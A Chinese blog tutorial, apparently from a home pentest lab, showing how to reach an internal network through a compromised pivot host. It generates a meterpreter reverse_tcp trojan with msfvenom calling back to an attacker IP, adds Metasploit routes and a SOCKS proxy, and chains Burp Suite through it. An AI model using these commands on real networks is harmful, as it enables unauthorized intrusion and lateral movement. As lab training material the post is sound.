> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/weixin_44288604/article/details/121420049)

### 目录

*   [burpsuite 设置 socks5 代理访问内网](#burpsuitesocks5_2)
*   [burpsuite 设置上游代理访问内网](#burpsuite_23)
*   *   [1. msfvenom 生成木马](#1_msfvenom_29)
    *   [2. 跳板机 win2012 运行木马](#2_win2012_39)
    *   [3. msf 获取 shell](#3_msfshell_40)
    *   [4. msf 起路由](#4_msf_43)
    *   [5. 配置 socks_proxy](#5_socks_proxy_50)
    *   [6. 配置 windwos](#6_windwos_80)
    *   *   [6.1 测试 win7 联通内网 web](#61_win7web_82)
        *   [6.2 设置 BurpSuite](#62_BurpSuite_100)

> 纸上得来终觉浅，绝知此事要躬行。网上资料怎么写的都有，花了大半天时间整理了一下😔

burpsuite 设置 socks5 代理访问[内网](https://so.csdn.net/so/search?q=%E5%86%85%E7%BD%91&spm=1001.2101.3001.7020)
========================================================================================================

测试环境如下：  
![](https://img-blog.csdnimg.cn/b8ad5b2e4ea34e7eb8ca7a46329fba7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

注意事项：关闭[跳板机](https://so.csdn.net/so/search?q=%E8%B7%B3%E6%9D%BF%E6%9C%BA&spm=1001.2101.3001.7020) win2012 的防火墙，否则可能出现隧道无法正常使用。

1.  跳板机配置隧道

`ew_for_Win.exe -s ssocksd -l 1080`  
![](https://img-blog.csdnimg.cn/2a130fcd48784309a527bddeb52fac20.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

2.  配置 BurpSuite

![](https://img-blog.csdnimg.cn/2154d03c72744914bff8708785b0dac3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

3.  访问内网机器

![](https://img-blog.csdnimg.cn/5f997df848f04b45ad7d73441060766d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

burpsuite 设置上游代理访问内网
====================

msf 拿下站点，如何转给 BurpSuite？  
拓扑图如下：  
![](https://img-blog.csdnimg.cn/c33de39b0b5f4ce98497bb437e11086b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

1. msfvenom 生成木马
----------------

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.239.141 lport=4455 -f exe >r.exe  
然后 msf 开启监听

```
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost  192.168.239.141
msf6 exploit(multi/handler) > set lport 4455
msf6 exploit(multi/handler) > exploit 

```

2. 跳板机 win2012 运行木马
-------------------

3. msf 获取 shell
---------------

![](https://img-blog.csdnimg.cn/0f2aa4e66a7c4e79b351da492829845c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

4. msf 起路由
----------

可以参考之前的文章：[https://www.yuque.com/u1881995/pborfs/nf2nn5#rAXIQ](https://www.yuque.com/u1881995/pborfs/nf2nn5#rAXIQ)  
4.1 查看网络接口信息：`run get_local_subnets`  
4.2 以 CIDR 的方式添加路由信息：`run autoroute -s 192.168.195.0/24`  
4.3 查看活动路由列表，确认路由情况：`run autoroute -p`  
![](https://img-blog.csdnimg.cn/a50e0b4dd0ad438dacc99b26c4257c70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

5. 配置 socks_proxy
-----------------

配置 socks_proxy，并运行

```
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > exploit 

```

下图中可以看到，没有 socks4a 了，取而代之的是`auxiliary/server/socks_proxy`，但是在配置选项，可以看到其支持 5 和 4a 两种，这里就用默认的 5 就行，**不需要做额外配置，直接运行。**  
![](https://img-blog.csdnimg.cn/f69ff8dd1a5a4a0eaccb83326a2fe296.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

6. 配置 windwos
-------------

这个时候先缕一缕思路啊，跳板机直通内网，kali 通过添加路由能间接通向内网。现在是如何让 win7 与 kali 之间建立隧道联系。在第 5 步中，msf 开启 socks 连接，win7 只需要把流量发到 kali 的 1080 端口即可。

### 6.1 测试 win7 联通内网 web

我这里使用插件 SwitchyOmega 配置一个代理，指明协议（kali 使用 socks5）、kali 的地址和 kali 监听的端口  
![](https://img-blog.csdnimg.cn/8eb1c1301f344106a9261e640ea4c6b0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

试着访问一下，发现完全 OK  
![](https://img-blog.csdnimg.cn/9e91ad35b07f4ebdafbb624ac5ce580a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

此时让我们再来捋一下思路。

1.  win2012 直通内网靶机
2.  msf 直通 win2012，通过添加路由，间接通向内网靶机
3.  win7 直通 kali，通过访问 msf 的 socks5 连接，将流量发送到 kali
4.  最终的体验效果，就像是 win7 可以通过浏览器访问内网 debian 的 web 服务

![](https://img-blog.csdnimg.cn/91d8fc10e2c54d86817a61e541a6b33b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

这里，就已经证明网络是通的了，下面就可以去设置 BurpSuite 了

### 6.2 设置 BurpSuite

这里有个问题，我要使用 BurpSuite，怎么玩呢？我们知道，win7 是通过 socks5 协议与 msf 建立连接的，那么，我可以让 win7 的浏览器走 BurpSuite，BurpSuite 再把流量转发给本地的 Socks 代理工具，再由代理工具把流量发给 msf 即可。如下图  
![](https://img-blog.csdnimg.cn/0bcd200966f04888abee3639c20ce13d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

1.  以管理员身份启动 SocksCap64，它才可以导入本机安装的浏览器。首次启动画面如下

![](https://img-blog.csdnimg.cn/fdaa8254431942818703aeffb15c70a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

![](https://img-blog.csdnimg.cn/c600d0cb2afd499eb1d71f6bebf01cef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

2.  添加代理

完事后点击右侧的 “保存” 按钮即可。  
![](https://img-blog.csdnimg.cn/1b7e3d19a593435e861f067bb160088d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

3.  测试网络是否通畅

![](https://img-blog.csdnimg.cn/b2c1cd44a9ab4857b8624a4cc79c9f88.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

4.  开启全局代理

SocksCap64 监听本地的 25378 端口  
![](https://img-blog.csdnimg.cn/e69573b218eb49fdb7962554f311f633.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

5.  BurpSuite 设置顶级代理访问内网

![](https://img-blog.csdnimg.cn/869faca1dc984130b3878f544abe50e7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

上面内容是英文的，就啰嗦一下上面写的都是啥玩意吧。拿中文版的 BurpSuite 解释一下。  
5.1 额外介绍的内容  
以经典的 burpsuite_pron_v2.1.07 为例，安装 java，激活 BurpSuite 之后，点击 “创建桌面快捷方式. bat”，就会在桌面创建一个图标。![](https://img-blog.csdnimg.cn/5187cc3a4ece4619b586e98efbd8e14b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

5.2 点击桌面的 BurpSuite 图标  
![](https://img-blog.csdnimg.cn/fbe42a64084a4f45a8c646c2e079cb22.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

6.  BurpSuite 可以使用了

![](https://img-blog.csdnimg.cn/4e47651e453b4b32ab15194ce54408bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)  
可以正常使用重放模块  
![](https://img-blog.csdnimg.cn/e10eb3e2152e44f78e2648bf947de50c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)